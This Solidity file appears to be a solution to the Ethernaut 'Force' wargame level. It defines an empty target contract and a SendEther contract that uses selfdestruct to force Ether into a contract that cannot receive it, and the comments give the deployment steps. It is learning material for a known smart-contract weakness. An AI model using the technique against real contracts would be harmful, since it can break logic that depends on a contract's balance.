// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// "Force" contract does not have the necessary modifications to support receiving Ether.
contract Force {
    // This contract does not contain any functions or fallback mechanisms.
}

// This contract is used to forcibly send Ether to a "Force" contract.
contract SendEther {
    constructor() payable {}

    // Fallback function to accept Ether when no data is sent.
    fallback() external payable {}

    // Receive function to accept Ether when data is empty.
    receive() external payable {}

    // This function, when called, sends all Ether to the specified address.
    function forceSend(address payable _to) public {
        selfdestruct(_to);
    }
}

// When deploying, "SendEther" contract should be deployed with 0.001 ETH (1000000 Gwei).
// Then use forceSend function from deployed contracts and send the all balance to the target (Force) contract address by using selfdestruct function. 
